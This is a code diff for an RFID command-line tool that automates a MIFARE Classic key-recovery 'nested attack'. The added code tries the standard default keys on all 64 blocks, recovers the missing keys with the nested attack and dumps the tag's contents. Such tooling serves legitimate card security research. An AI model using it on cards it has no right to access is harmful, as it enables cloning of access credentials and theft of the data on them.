@@ -8,9 +8,9 @@ import Device, { KeyType, parseKey, parseKeyType } from './Device.mjs'
 
 const STANDARD_KEYS = ['FFFFFFFFFFFF', 'A0A1A2A3A4A5', 'D3F7D3F7D3F7', '000000000000']
 
-const nested = (args: string[]): string[] => {
+const nested = (args: string[]): Set<string> => {
   const stdout = spawnSync('./bin/nested', args, { encoding: 'utf-8' }).stdout
-  return stdout
+  const keys = stdout
     .trim()
     .split('\n')
     .flatMap(line => {
@@ -19,6 +19,7 @@ const nested = (args: string[]): string[] => {
       if (match === null) return []
       return [match[1]]
     })
+  return new Set(keys)
 }
 
 const program = new Command()
@@ -106,9 +107,9 @@ program
       const args = [uid, distance, ...groups.flatMap(group => [group.nt, group.ntEnc, group.par])].map(String)
 
       const keys = nested(args)
-      if (keys.length === 0) throw new Error('No keys found')
+      if (keys.size === 0) throw new Error('No keys found')
 
-      console.log(chalk.greenBright(`Found ${keys.length} key${keys.length === 1 ? '' : 's'}`))
+      console.log(chalk.greenBright(`Found ${keys.size} key${keys.size === 1 ? '' : 's'}`))
 
       for (const key of keys) {
         try {
@@ -152,20 +153,53 @@ program
   .description('Dump all blocks using nested attack')
   .argument('[keys...]', 'known keys')
   .action(async (providedKeys: string[]) => {
-    const uniqueKeys = new Set([...STANDARD_KEYS, ...providedKeys])
-    const keys = [...uniqueKeys].map(key => Buffer.from(key, 'hex'))
+    const keys = new Set([...STANDARD_KEYS, ...providedKeys].map(key => key.toLowerCase()))
     const blocks = Array(64).fill(null) as Array<null | { key: Buffer; data: Buffer }>
     const device = await Device.connect()
 
     await device.scanTag14A()
 
-    for (let i = 0; i < 64; i++) {
-      for (const key of keys) {
-        const data = await device.readMifareBlock(i, KeyType.A, key).catch(() => null)
-        if (data === null) continue
-        blocks[i] = { key, data }
-        break
+    const testKeys = async (block: number, keysToTest = keys): Promise<string | null> => {
+      console.log(chalk.gray(`Testing keys for block ${block}`))
+
+      for (const keyString of keysToTest) {
+        const key = Buffer.from(keyString, 'hex')
+        const response = await device.readMifareBlock(block, KeyType.A, key).catch(() => null)
+        if (response === null) continue
+        blocks[block] = { key, data: response }
+        return key.toString('hex')
       }
+
+      return null
+    }
+
+    for (let i = 0; i < 64; i++) await testKeys(i)
+
+    const knownBlockIndex = blocks.findIndex(block => block !== null)
+    const knownBlock = blocks[knownBlockIndex]
+    if (!knownBlock) throw new Error('No known block found')
+
+    for (let i = 0; i < 64; i++) {
+      // Skip known blocks
+      if (blocks[i] !== null) continue
+
+      // Test keys that have been found so far
+      await testKeys(i)
+      // If a key has now been found, skip to next block
+      if (blocks[i] !== null) continue
+
+      // Run nested attack
+      const { uid, distance } = await device.detectNtDistance(knownBlockIndex, KeyType.A, knownBlock.key)
+      const groups = await device.acquireNestedGroups(knownBlockIndex, KeyType.A, knownBlock.key, i, KeyType.A)
+      const args = [uid, distance, ...groups.flatMap(group => [group.nt, group.ntEnc, group.par])].map(String)
+      const foundKeys = nested(args)
+      console.log(chalk.gray(`Ran nested attack on block ${i}: found ${foundKeys.size} key(s)`))
+
+      // Test keys that have been found
+      const workingKey = await testKeys(i, foundKeys)
+
+      // Add the working key to the list of known keys
+      if (workingKey !== null) keys.add(workingKey)
     }
 
     for (let i = 0; i < 64; i++) {
